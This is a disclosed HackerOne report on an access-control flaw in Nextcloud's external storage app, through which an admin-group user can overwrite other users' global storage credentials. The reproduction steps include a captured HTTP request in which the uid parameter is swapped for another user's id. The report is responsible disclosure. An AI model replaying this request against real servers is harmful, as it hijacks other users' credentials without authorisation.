# Admins can change authentication details of user configured external storage

## Report Details
- **Report ID**: 2107934
- **URL**: https://hackerone.com/reports/2107934
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-08-14T00:12:27.454Z
- **Disclosed**: 2023-12-21T05:17:43.612Z

## Reporter
- **Username**: st0nzyy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:

After some testing in nextcloud server, i found improper access control make users in admin group to change any "Global credentials" for admin/user external storage

Note* this issue affect ```admin to admin & admin to user.```

## Steps To Reproduce:

- As a malicious admin user
- Navigate to External storage
- At the global credentials input any random valid credentials for example POC:anything
- Intercept the following request
```
POST /nextcloud/index.php/apps/files_external/globalcredentials HTTP/1.1
Host: 192.168.56.103
Content-Length: 43
Accept: application/json, text/javascript, */*; q=0.01
requesttoken: fFwUgm3xqnKq1YBdX5pj8eskJP+6VwfEYSUkhdEbADE=:GQwn4z6nyTrCuOVtbe9Vg6pnfIf/HXezJhNU3P50bFQ=
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
OCS-APIREQUEST: true
Content-Type: application/json
Origin: http://192.168.56.103
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: oc_sessionPassphrase=B4MUb9O8t71%2BDkT%2FXpeTcrJgb5FoSTRXXKwlRJTJKQ027je%2F7KT2XbFCPs6hU4WgjzTv6iQ1GZfwvVXQ7QsiBM%2FJL5pKT8W4yj4ZU237V4yWGWCERO8hHjEYCnHSp671; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc6xi9hj9sei=irdv8ml4hrgm7gg57v104tj20t; nc_username=nvz; nc_token=o4gwXiPvdr4j3Ba7glzBLoN%2FdhDu6Uvo; nc_session_id=irdv8ml4hrgm7gg57v104tj20t
Connection: close

{"uid":"nvz","user":"nvz","password":"123"}
```

- Change the ```uid``` parameter to any other user or  admin 

- As a result we notice the following response
```true```
- And by navigating to the user effected we notice the Global Credentials been changed

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

https://docs.nextcloud.com/server/27/admin_manual/configuration_files/external_storage_configuration_gui.html#storage-configuration

## Impact

users in admin group can change any "Global credentials" for admin/user external storage

## Attachments
- users-groups.jpg
- externalstorage.png
- full-image.JPG
